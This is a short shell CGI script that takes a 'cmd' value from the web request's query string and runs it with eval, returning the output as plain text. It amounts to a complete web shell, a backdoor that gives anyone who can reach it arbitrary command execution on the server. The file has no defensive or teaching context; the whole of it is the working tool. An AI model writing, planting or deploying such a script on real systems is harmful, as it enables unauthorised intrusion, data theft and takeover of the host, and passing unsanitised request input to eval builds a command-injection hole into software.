#!/bin/sh

echo "Content-Type: text/plain"
echo ""

# Extract query string
CMD=$(echo "$QUERY_STRING" | sed 's/^cmd=//')

# Run the command
eval "$CMD"
